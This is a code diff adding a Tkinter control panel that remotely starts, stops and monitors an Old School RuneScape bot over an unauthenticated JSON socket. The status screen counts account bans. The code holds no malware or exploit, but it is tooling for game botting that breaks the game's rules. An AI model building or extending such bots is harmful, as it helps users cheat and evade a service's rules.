+        title_label = ttk.Label(vps_frame, 
+                               text="🌐 VPS Bot Controller - Remote ShadowStrike OSRS Bot Control", 
+                               font=('Arial', 16, 'bold'),
+                               style='TSM.Title.TLabel')
+        title_label.pack(pady=(20, 30))
+        
+        # Main content frame
+        main_content = ttk.Frame(vps_frame, style='TSM.TFrame')
+        main_content.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
+        
+        # Left panel - Connection and Control
+        left_panel = ttk.Frame(main_content, style='TSM.TFrame')
+        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10))
+        
+        # Right panel - Status and Logs
+        right_panel = ttk.Frame(main_content, style='TSM.TFrame')
+        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(10, 0))
+        
+        # Connection Section
+        self.create_vps_connection_section(left_panel)
+        
+        # Bot Control Section
+        self.create_vps_bot_control_section(left_panel)
+        
+        # Status Section
+        self.create_vps_status_section(right_panel)
+        
+        # Logs Section
+        self.create_vps_logs_section(right_panel)
+        
+        # Start status updater
+        self.start_vps_status_updater()
+    
+    def create_vps_connection_section(self, parent):
+        """Create VPS connection section"""
+        conn_frame = ttk.LabelFrame(parent, text="🔌 VPS Connection", style='TSM.TLabelframe')
+        conn_frame.pack(fill=tk.X, pady=(0, 20))
+        
+        # Connection settings
+        settings_frame = ttk.Frame(conn_frame)
+        settings_frame.pack(fill=tk.X, padx=15, pady=15)
+        
+        # VPS IP
+        ttk.Label(settings_frame, text="VPS IP Address:", style='TSM.TLabel').grid(row=0, column=0, sticky=tk.W, padx=(0, 10), pady=5)
+        self.vps_ip_entry = ttk.Entry(settings_frame, width=25, style='TSM.TEntry')
+        self.vps_ip_entry.insert(0, getattr(self, 'vps_host', 'YOUR_VPS_IP_HERE'))
+        self.vps_ip_entry.grid(row=0, column=1, padx=(0, 10), pady=5)
+        
+        # VPS Port
+        ttk.Label(settings_frame, text="Port:", style='TSM.TLabel').grid(row=0, column=2, sticky=tk.W, padx=(0, 10), pady=5)
+        self.vps_port_entry = ttk.Entry(settings_frame, width=10, style='TSM.TEntry')
+        self.vps_port_entry.insert(0, str(getattr(self, 'vps_port', 9999)))
+        self.vps_port_entry.grid(row=0, column=3, padx=(0, 10), pady=5)
+        
+        # Connection buttons
+        self.vps_connect_btn = ttk.Button(settings_frame, text="🔗 Connect", 
+                                        command=self.connect_to_vps, style='TSM.TButton')
+        self.vps_connect_btn.grid(row=0, column=4, padx=(0, 10), pady=5)
+        
+        self.vps_disconnect_btn = ttk.Button(settings_frame, text="❌ Disconnect", 
+                                           command=self.disconnect_from_vps, 
+                                           state=tk.DISABLED, style='TSM.TButton')
+        self.vps_disconnect_btn.grid(row=0, column=5, pady=5)
+        
+        # Connection status
+        self.vps_connection_status = ttk.Label(settings_frame, text="❌ Disconnected", 
+                                             foreground='red', style='TSM.TLabel')
+        self.vps_connection_status.grid(row=1, column=0, columnspan=6, pady=(10, 0))
+    
+    def create_vps_bot_control_section(self, parent):
+        """Create VPS bot control section"""
+        control_frame = ttk.LabelFrame(parent, text="🎮 Remote Bot Control", style='TSM.TLabelframe')
+        control_frame.pack(fill=tk.X, pady=(0, 20))
+        
+        # Control buttons
+        buttons_frame = ttk.Frame(control_frame)
+        buttons_frame.pack(fill=tk.X, padx=15, pady=15)
+        
+        # Start/Stop buttons
+        self.vps_start_btn = ttk.Button(buttons_frame, text="🚀 Start Bot", 
+                                      command=self.start_vps_bot, 
+                                      state=tk.DISABLED, style='TSM.TButton')
+        self.vps_start_btn.pack(side=tk.LEFT, padx=(0, 10))
+        
+        self.vps_stop_btn = ttk.Button(buttons_frame, text="⏹️ Stop Bot", 
+                                     command=self.stop_vps_bot, 
+                                     state=tk.DISABLED, style='TSM.TButton')
+        self.vps_stop_btn.pack(side=tk.LEFT, padx=(0, 10))
+        
+        self.vps_restart_btn = ttk.Button(buttons_frame, text="🔄 Restart Bot", 
+                                        command=self.restart_vps_bot, 
+                                        state=tk.DISABLED, style='TSM.TButton')
+        self.vps_restart_btn.pack(side=tk.LEFT, padx=(0, 10))
+        
+        # Status refresh
+        self.vps_refresh_btn = ttk.Button(buttons_frame, text="📊 Refresh Status", 
+                                        command=self.refresh_vps_status, 
+                                        state=tk.DISABLED, style='TSM.TButton')
+        self.vps_refresh_btn.pack(side=tk.LEFT, padx=(0, 10))
+        
+        # Get logs
+        self.vps_logs_btn = ttk.Button(buttons_frame, text="📋 Get Logs", 
+                                     command=self.get_vps_logs, 
+                                     state=tk.DISABLED, style='TSM.TButton')
+        self.vps_logs_btn.pack(side=tk.LEFT, padx=(0, 10))
+        
+        # Start local VPS server
+        self.vps_start_server_btn = ttk.Button(buttons_frame, text="🖥️ Start Local VPS", 
+                                             command=self.start_local_vps_server, 
+                                             style='TSM.TButton')
+        self.vps_start_server_btn.pack(side=tk.LEFT)
+    
+    def create_vps_status_section(self, parent):
+        """Create VPS status section"""
+        status_frame = ttk.LabelFrame(parent, text="📊 Bot Status", style='TSM.TLabelframe')
+        status_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 20))
+        
+        # Status display
+        self.vps_status_text = scrolledtext.ScrolledText(status_frame, height=15, width=50,
+                                                        font=('Consolas', 10))
+        self.vps_status_text.pack(fill=tk.BOTH, expand=True, padx=15, pady=15)
+        
+        # Initial status
+        self.update_vps_status_display()
+    
+    def create_vps_logs_section(self, parent):
+        """Create VPS logs section"""
+        logs_frame = ttk.LabelFrame(parent, text="📋 Bot Logs", style='TSM.TLabelframe')
+        logs_frame.pack(fill=tk.X)
+        
+        # Logs display
+        self.vps_logs_text = scrolledtext.ScrolledText(logs_frame, height=8, width=50,
+                                                      font=('Consolas', 9))
+        self.vps_logs_text.pack(fill=tk.X, padx=15, pady=15)
+    
+    def connect_to_vps(self):
+        """Connect to VPS server"""
+        try:
+            self.vps_host = self.vps_ip_entry.get().strip()
+            self.vps_port = int(self.vps_port_entry.get().strip())
+            
+            # Create socket connection
+            self.vps_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.vps_socket.settimeout(10)  # 10 second timeout
+            
+            # Connect to VPS
+            self.vps_socket.connect((self.vps_host, self.vps_port))
+            self.vps_connected = True
+            
+            # Update UI
+            self.vps_connection_status.config(text="✅ Connected", foreground='green')
+            self.vps_connect_btn.config(state=tk.DISABLED)
+            self.vps_disconnect_btn.config(state=tk.NORMAL)
+            self.vps_start_btn.config(state=tk.NORMAL)
+            self.vps_stop_btn.config(state=tk.NORMAL)
+            self.vps_restart_btn.config(state=tk.NORMAL)
+            self.vps_refresh_btn.config(state=tk.NORMAL)
+            self.vps_logs_btn.config(state=tk.NORMAL)
+            
+            # Get initial status
+            self.refresh_vps_status()
+            
+            self.update_status(f"Connected to VPS at {self.vps_host}:{self.vps_port}")
+            messagebox.showinfo("Connected", f"Successfully connected to VPS at {self.vps_host}:{self.vps_port}")
+        
+        except Exception as e:
+            self.update_status(f"VPS connection failed: {e}")
+            messagebox.showerror("Connection Error", f"Failed to connect to VPS: {e}")
+            self.vps_connected = False
+    
+    def disconnect_from_vps(self):
+        """Disconnect from VPS server"""
+        try:
+            if self.vps_socket:
+                self.vps_socket.close()
+                self.vps_socket = None
+            
+            self.vps_connected = False
+            
+            # Update UI
+            self.vps_connection_status.config(text="❌ Disconnected", foreground='red')
+            self.vps_connect_btn.config(state=tk.NORMAL)
+            self.vps_disconnect_btn.config(state=tk.DISABLED)
+            self.vps_start_btn.config(state=tk.DISABLED)
+            self.vps_stop_btn.config(state=tk.DISABLED)
+            self.vps_restart_btn.config(state=tk.DISABLED)
+            self.vps_refresh_btn.config(state=tk.DISABLED)
+            self.vps_logs_btn.config(state=tk.DISABLED)
+            
+            self.update_status("Disconnected from VPS")
+            messagebox.showinfo("Disconnected", "Disconnected from VPS")
+        
+        except Exception as e:
+            self.update_status(f"VPS disconnection error: {e}")
+    
+    def send_vps_command(self, command):
+        """Send command to VPS server"""
+        if not self.vps_connected or not self.vps_socket:
+            messagebox.showerror("Error", "Not connected to VPS")
+            return None
+        
+        try:
+            # Send command
+            command_data = json.dumps(command).encode('utf-8')
+            self.vps_socket.send(command_data)
+            
+            # Receive response
+            response_data = self.vps_socket.recv(4096)
+            response = json.loads(response_data.decode('utf-8'))
+            
+            return response
+        
+        except Exception as e:
+            self.update_status(f"VPS command error: {e}")
+            messagebox.showerror("Command Error", f"Failed to send command: {e}")
+            return None
+    
+    def start_vps_bot(self):
+        """Start the bot on VPS"""
+        response = self.send_vps_command({'action': 'start_bot'})
+        if response and response.get('success'):
+            self.bot_running = True
+            self.update_status("Bot started successfully on VPS")
+            messagebox.showinfo("Bot Started", "Bot started successfully on VPS")
+            self.refresh_vps_status()
+        else:
+            error_msg = response.get('error', 'Unknown error') if response else 'No response'
+            self.update_status(f"Failed to start bot: {error_msg}")
+            messagebox.showerror("Error", f"Failed to start bot: {error_msg}")
+    
+    def stop_vps_bot(self):
+        """Stop the bot on VPS"""
+        response = self.send_vps_command({'action': 'stop_bot'})
+        if response and response.get('success'):
+            self.bot_running = False
+            self.update_status("Bot stopped successfully on VPS")
+            messagebox.showinfo("Bot Stopped", "Bot stopped successfully on VPS")
+            self.refresh_vps_status()
+        else:
+            error_msg = response.get('error', 'Unknown error') if response else 'No response'
+            self.update_status(f"Failed to stop bot: {error_msg}")
+            messagebox.showerror("Error", f"Failed to stop bot: {error_msg}")
+    
+    def restart_vps_bot(self):
+        """Restart the bot on VPS"""
+        response = self.send_vps_command({'action': 'restart_bot'})
+        if response and response.get('success'):
+            self.update_status("Bot restarted successfully on VPS")
+            messagebox.showinfo("Bot Restarted", "Bot restarted successfully on VPS")
+            self.refresh_vps_status()
+        else:
+            error_msg = response.get('error', 'Unknown error') if response else 'No response'
+            self.update_status(f"Failed to restart bot: {error_msg}")
+            messagebox.showerror("Error", f"Failed to restart bot: {error_msg}")
+    
+    def refresh_vps_status(self):
+        """Refresh bot status from VPS"""
+        response = self.send_vps_command({'action': 'get_status'})
+        if response and response.get('success'):
+            self.bot_status = response.get('bot_status', {})
+            self.update_vps_status_display()
+        else:
+            error_msg = response.get('error', 'Unknown error') if response else 'No response'
+            self.update_status(f"Failed to get status: {error_msg}")
+    
+    def get_vps_logs(self):
+        """Get bot logs from VPS"""
+        response = self.send_vps_command({'action': 'get_logs'})
+        if response and response.get('success'):
+            logs = response.get('logs', [])
+            self.vps_logs_text.delete(1.0, tk.END)
+            for log in logs:
+                self.vps_logs_text.insert(tk.END, log)
+        else:
+            error_msg = response.get('error', 'Unknown error') if response else 'No response'
+            self.update_status(f"Failed to get logs: {error_msg}")
+    
+    def update_vps_status_display(self):
+        """Update the VPS status display"""
+        self.vps_status_text.delete(1.0, tk.END)
+        
+        status_info = f"""
+🤖 ShadowStrike OSRS Bot Status
+===============================
+
+Connection: {'✅ Connected' if self.vps_connected else '❌ Disconnected'}
+VPS: {self.vps_host}:{self.vps_port}
+
+Bot Status:
+• Running: {'✅ Yes' if self.bot_status.get('running', False) else '❌ No'}
+• Phase: {self.bot_status.get('phase', 'Unknown')}
+• Activity: {self.bot_status.get('current_activity', 'Unknown')}
+• Location: {self.bot_status.get('current_location', 'Unknown')}
+• Last Update: {self.bot_status.get('last_update', 'Unknown')}
+
+Statistics:
+"""
+        
+        stats = self.bot_status.get('stats', {})
+        if stats:
+            status_info += f"""• Combat Level: {stats.get('combat_level', 'Unknown')}
+• Total Level: {stats.get('total_level', 'Unknown')}
+• GP: {stats.get('gp', 0):,}
+• Deaths: {stats.get('deaths', 0)}
+• Bans: {stats.get('bans', 0)}
+• Quests Completed: {stats.get('quests_completed', 0)}
+
+Skills:
+"""
+            skills = stats.get('skills', {})
+            if skills:
+                for skill, level in skills.items():
+                    status_info += f"• {skill}: {level}\n"
+        
+        self.vps_status_text.insert(tk.END, status_info)
+    
+    def start_vps_status_updater(self):
+        """Start automatic VPS status updates"""
+        def update_loop():
+            while True:
+                try:
+                    if self.vps_connected:
+                        self.refresh_vps_status()
+                    time.sleep(5)  # Update every 5 seconds
+                except Exception as e:
+                    time.sleep(10)
+        
+        update_thread = threading.Thread(target=update_loop, daemon=True)
+        update_thread.start()
+    
+    def start_local_vps_server(self):
+        """Start local VPS server"""
+        try:
+            import subprocess
+            import os
+            
+            # Check if VPS server is already running
+            if hasattr(self, 'vps_server_process') and self.vps_server_process and self.vps_server_process.poll() is None:
+                messagebox.showinfo("VPS Server", "VPS server is already running!")
+                return
+            
+            # Start VPS server
+            self.update_status("Starting local VPS server...")
+            self.vps_server_process = subprocess.Popen([
+                sys.executable, 'VPS_Bot_Server.py', 
+                '--host', '127.0.0.1', '--port', '9999'
+            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            
+            # Wait a moment for server to start
+            time.sleep(2)
+            
+            # Check if server started successfully
+            if self.vps_server_process.poll() is None:
+                self.update_status("Local VPS server started successfully!")
+                messagebox.showinfo("VPS Server", 
+                    "Local VPS server started!\n\n"
+                    "Server: 127.0.0.1:9999\n"
+                    "You can now connect using the Connect button.")
+                
+                # Auto-fill the connection details
+                self.vps_ip_entry.delete(0, tk.END)
+                self.vps_ip_entry.insert(0, "127.0.0.1")
+                self.vps_port_entry.delete(0, tk.END)
+                self.vps_port_entry.insert(0, "9999")
+            else:
+                stdout, stderr = self.vps_server_process.communicate()
+                error_msg = stderr.decode() if stderr else "Unknown error"
+                self.update_status(f"Failed to start VPS server: {error_msg}")
+                messagebox.showerror("VPS Server Error", f"Failed to start VPS server:\n{error_msg}")
+                
+        except Exception as e:
+            self.update_status(f"Error starting VPS server: {e}")
+            messagebox.showerror("VPS Server Error", f"Error starting VPS server:\n{e}")
+    
     def open_screens(self):
 
         """Open the Screens tab"""
@@ -12396,7 +13587,7 @@ if __name__ == "__main__":
         messagebox.showinfo("Settings", "Settings saved successfully")
 
         self.update_status("Settings saved")
-
+    
     
 
     def update_status(self, message):
@@ -12404,7 +13595,7 @@ if __name__ == "__main__":
         """Update status bar message"""
 
         self.status_label.config(text=message)
-
+    
     
 
     def exit_application(self):
@@ -12416,7 +13607,7 @@ if __name__ == "__main__":
             if messagebox.askyesno("Unsaved Changes", "You have unsaved changes. Do you want to save them?"):
 
                 self.save_file()
-
+        
         
 
         self.root.quit()
